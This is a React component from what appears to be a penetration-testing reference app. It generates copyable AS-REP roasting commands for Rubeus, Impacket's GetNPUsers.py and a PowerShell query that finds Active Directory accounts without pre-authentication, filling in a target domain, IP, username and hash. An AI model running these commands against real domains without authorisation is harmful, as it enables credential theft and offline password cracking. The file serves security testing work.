import { useState } from "react";
import { X, Copy } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { toast } from "@/hooks/use-toast";

interface Technique {
  id: string;
  title: string;
  description: string;
  phase: string;
  tags: string[];
  tools: string[];
  starred: boolean;
  category: string;
}

interface CommandGeneratorProps {
  technique: Technique;
  isOpen: boolean;
  onClose: () => void;
}

interface CommandTemplate {
  tool: string;
  template: string;
  description: string;
  params: string[];
}

const getCommandTemplates = (technique: Technique): CommandTemplate[] => {
  // Return different templates based on technique
  return [
    {
      tool: "Rubeus",
      template: "Rubeus.exe asrep-roast /outfile:asrep_hashes.txt",
      description: "Extract AS-REP hashes for accounts without pre-authentication",
      params: ["target_domain", "target_ip", "username", "password_hash"]
    },
    {
      tool: "Impacket", 
      template: "GetNPUsers.py target.local/ -usersfile users.txt -dc-ip 10.10.10.10",
      description: "Request AS-REP for users without pre-authentication",
      params: ["target_domain", "target_ip", "username", "password_hash"]
    },
    {
      tool: "PowerShell",
      template: "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth",
      description: "Find accounts with pre-authentication disabled",
      params: ["target_domain", "target_ip", "username", "password_hash"]
    }
  ];
};

export const CommandGenerator = ({ technique, isOpen, onClose }: CommandGeneratorProps) => {
  const [targetDomain, setTargetDomain] = useState("target.local");
  const [targetIP, setTargetIP] = useState("10.10.10.10");
  const [username, setUsername] = useState("user");
  const [passwordHash, setPasswordHash] = useState("password or hash");
  const [editedTemplates, setEditedTemplates] = useState<{[key: number]: string}>({});

  const commandTemplates = getCommandTemplates(technique);

  const getEditableTemplate = (index: number) => {
    return editedTemplates[index] || commandTemplates[index].template;
  };

  const updateTemplate = (index: number, newTemplate: string) => {
    setEditedTemplates(prev => ({
      ...prev,
      [index]: newTemplate
    }));
  };

  const generateCommand = (template: string) => {
    return template
      .replace(/target\.local/g, targetDomain)
      .replace(/10\.10\.10\.10/g, targetIP)
      .replace(/user/g, username)
      .replace(/password or hash/g, passwordHash);
  };

  const copyCommand = (command: string) => {
    navigator.clipboard.writeText(command);
    toast({
      title: "Copied",
      description: "Command copied to clipboard."
    });
  };

  const generateAllCommands = () => {
    const allCommands = commandTemplates.map((template, index) => 
      `# ${template.tool}\n${generateCommand(getEditableTemplate(index))}`
    ).join('\n\n');
    
    navigator.clipboard.writeText(allCommands);
    toast({
      title: "All Commands Copied",
      description: "All generated commands copied to clipboard."
    });
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-2xl max-h-[90vh] overflow-hidden bg-card border-border">
        <DialogHeader className="flex flex-row items-center justify-between space-y-0 pb-4 border-b border-border/30">
          <DialogTitle className="text-xl font-semibold">Command Generator</DialogTitle>
          <Button
            variant="ghost" 
            size="sm"
            onClick={onClose}
            className="h-6 w-6 p-0 hover:bg-muted"
          >
            <X className="h-4 w-4" />
          </Button>
        </DialogHeader>

        <div className="space-y-6 overflow-y-auto max-h-[calc(90vh-120px)] p-1">
          {/* Header */}
          <div>
            <h3 className="text-lg font-semibold text-foreground mb-2">
              Command Templates for {technique.title}
            </h3>
            <p className="text-sm text-muted-foreground">
              Fill in the placeholders below to generate custom commands:
            </p>
          </div>

          {/* Input Parameters */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <Label htmlFor="target-domain" className="text-sm font-medium">Target Domain</Label>
              <Input
                id="target-domain"
                value={targetDomain}
                onChange={(e) => setTargetDomain(e.target.value)}
                className="bg-muted/30 border-border/50"
                placeholder="target.local"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="target-ip" className="text-sm font-medium">Target IP</Label>
              <Input
                id="target-ip"
                value={targetIP}
                onChange={(e) => setTargetIP(e.target.value)}
                className="bg-muted/30 border-border/50"
                placeholder="10.10.10.10"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="username" className="text-sm font-medium">Username</Label>
              <Input
                id="username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="bg-muted/30 border-border/50"
                placeholder="user"
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="password-hash" className="text-sm font-medium">Password/Hash</Label>
              <Input
                id="password-hash"
                value={passwordHash}
                onChange={(e) => setPasswordHash(e.target.value)}
                className="bg-muted/30 border-border/50"
                placeholder="password or hash"
              />
            </div>
          </div>

          {/* Generated Commands */}
          <div className="space-y-4">
            {commandTemplates.map((template, index) => (
              <Card key={index} className="bg-muted/20 border-border/50">
                <CardHeader className="pb-3">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-lg text-primary">{template.tool}</CardTitle>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => copyCommand(generateCommand(getEditableTemplate(index)))}
                      className="hover:bg-primary/10"
                    >
                      <Copy className="h-4 w-4 mr-2" />
                      Copy
                    </Button>
                  </div>
                </CardHeader>
                <CardContent className="space-y-3">
                  {/* Editable Command Template */}
                  <div className="space-y-2">
                    <Label className="text-xs font-medium text-muted-foreground">
                      Command Template (editable):
                    </Label>
                    <Textarea
                      value={getEditableTemplate(index)}
                      onChange={(e) => updateTemplate(index, e.target.value)}
                      className="text-sm font-mono bg-background/50 border resize-none"
                      rows={2}
                      placeholder="Edit command template..."
                    />
                  </div>
                  
                  {/* Generated Command Preview */}
                  <div className="space-y-2">
                    <Label className="text-xs font-medium text-muted-foreground">
                      Generated Command:
                    </Label>
                    <code className="text-sm font-mono bg-background/80 p-3 rounded block whitespace-pre-wrap border text-foreground">
                      {generateCommand(getEditableTemplate(index))}
                    </code>
                  </div>
                  
                  <p className="text-xs text-muted-foreground">
                    {template.description}
                  </p>
                </CardContent>
              </Card>
            ))}
          </div>

          {/* Generate All Button */}
          <div className="pt-4 border-t border-border/30">
            <Button 
              onClick={generateAllCommands}
              className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
            >
              Generate Commands
            </Button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};